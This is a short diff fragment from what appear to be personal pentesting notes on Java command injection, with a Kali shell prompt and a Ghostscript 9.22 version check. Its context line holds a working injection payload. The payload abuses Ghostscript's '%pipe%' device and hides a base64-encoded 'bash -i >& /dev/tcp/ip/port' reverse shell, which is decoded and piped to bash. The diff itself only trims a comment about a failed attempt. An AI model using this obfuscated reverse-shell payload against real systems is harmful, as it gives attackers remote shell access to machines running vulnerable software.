@@ -10,7 +10,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK
 java RuntimeTest '%pipe%`{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK}|{base64,-d}|{bash,-i}`' test "/u01/project/JavaCommandInjection/"
 
 
-:: did not work on -- will have to try again, forgot back ticks
+:: did not work on 
 
 root@kali:/u02/projects/JavaCommandInjection# /usr/bin/gs -version
 GPL Ghostscript 9.22 (2017-10-04)
